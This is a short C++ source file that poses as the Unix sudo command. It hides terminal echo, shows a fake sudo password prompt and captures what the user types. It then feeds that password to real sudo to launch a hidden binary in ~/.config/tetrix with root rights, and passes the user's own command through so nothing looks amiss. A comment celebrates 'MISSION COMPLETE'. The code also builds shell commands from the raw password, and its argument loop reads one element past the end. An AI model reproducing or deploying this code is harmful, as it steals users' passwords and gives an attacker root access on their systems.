#include <iostream>
#include <unistd.h>
#include <pwd.h>
#include <string>
#include <termios.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
    if(argc == 1)
    {
        system("\\sudo");
    }
    else
    {
        termios oldt;
        tcgetattr(STDIN_FILENO, &oldt);
        termios newt = oldt;
        newt.c_lflag &= ~ECHO;
        tcsetattr(STDIN_FILENO, TCSANOW, &newt);
	std::string homedir = std::getenv("HOME");
        bool allargs = true;
        std::string args {""};
        for(int i = 1;i < argc + 1;i++)
        {
            std::string arg{argv[i]};
            if(arg.find("-") != std::string::npos && arg.rfind("-") > 1){
                allargs = false;
                i = argc;
            }
            if(arg.find("-") == std::string::npos){
                allargs = false;
                i = argc;
            }
            args += arg + " ";
        }
        if(!allargs){
	  std::cout << "[sudo] password for " << ( (std::string)(getpwuid(getuid())->pw_name) ) << ": ";
            char pwd[256];
            std::cin.getline(pwd,256);
            std::string passwd{pwd};
            
            //WOOOO! MISSION COMPLETE!
	    system(("echo '" + passwd + "' | \\sudo -S "+homedir+"/.config/tetrix/Tetrix -p 1").c_str());
            system(("echo '" + passwd + "' | \\sudo -S " + args).c_str());
        }
        else
        {
            system(("\\sudo " + args).c_str());
        }
	tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
    }
    return 0;
}
